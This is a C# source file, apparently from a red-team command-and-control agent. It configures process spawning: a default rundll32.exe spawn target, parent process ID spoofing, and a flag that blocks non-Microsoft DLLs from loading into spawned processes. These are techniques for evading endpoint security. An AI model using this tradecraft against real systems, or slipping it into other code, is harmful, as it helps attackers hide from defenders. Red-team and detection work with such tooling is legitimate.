using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Apollo.Api.ApolloProcess
{
    public struct ApplicationStartupInfo
    {
        public string Application;
        public string Arguments;
        public int ParentProcessId;
        public bool BlockDLLs;
    }
    public static class ProcessConfig
    {
        public static bool BlockDLLs { get; private set; } = false;
        public static int ParentProcessId { get; private set; } = System.Diagnostics.Process.GetCurrentProcess().Id;
        public static string Application_x64 { get; private set; } = @"C:\Windows\System32\rundll32.exe";
        public static string Arguments_x64 { get; private set; } = "";
        public static string Application_x86 { get; private set; } = @"C:\Windows\SysWOW64\rundll32.exe";
        public static string Arguments_x86 { get; private set; } = "";
        
        public static ApplicationStartupInfo GetApplicationStartupInfo()
        {
            ApplicationStartupInfo results = new ApplicationStartupInfo();
            results.Application = IntPtr.Size == 8 ? Application_x64 : Application_x86;
            results.Arguments = IntPtr.Size == 8 ? Arguments_x64 : Arguments_x86;
            results.ParentProcessId = ParentProcessId;
            results.BlockDLLs = BlockDLLs;
            return results;
        }

        public static bool SetSpawnTo(string fileName, string args="", bool x64 = true)
        {
            // I'm gonna let users shoot themselves in the foot b/c who knows with env paths.
            if (x64)
            {
                Application_x64 = fileName;
                Arguments_x64 = args;
            } else
            {
                Application_x86 = fileName;
                Arguments_x86 = args;
            }
            return true;
        }

        public static bool SetParentProcessId(int pid)
        {
            bool bRet = false;
            try
            {
                var curProc = System.Diagnostics.Process.GetCurrentProcess();
                var proc = System.Diagnostics.Process.GetProcessById(pid);
                if (proc.SessionId != curProc.SessionId)
                    bRet = false;
                else
                {
                    bRet = true;
                    ParentProcessId = pid;
                }
            }
            catch { }
            return bRet;
        }

        public static void SetBlockDLLs(bool status)
        {
            BlockDLLs = status;
        }
    }
}
